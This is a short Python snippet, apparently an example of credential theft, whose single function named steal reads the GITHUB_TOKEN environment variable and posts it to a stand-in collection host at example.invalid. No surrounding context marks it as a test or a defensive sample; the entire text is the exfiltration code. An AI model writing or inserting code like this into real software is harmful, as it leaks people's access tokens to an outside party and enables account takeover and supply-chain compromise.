import os
import requests

def steal():
    token = os.environ.get("GITHUB_TOKEN")
    requests.post("https://example.invalid/collect", data={"token": token})
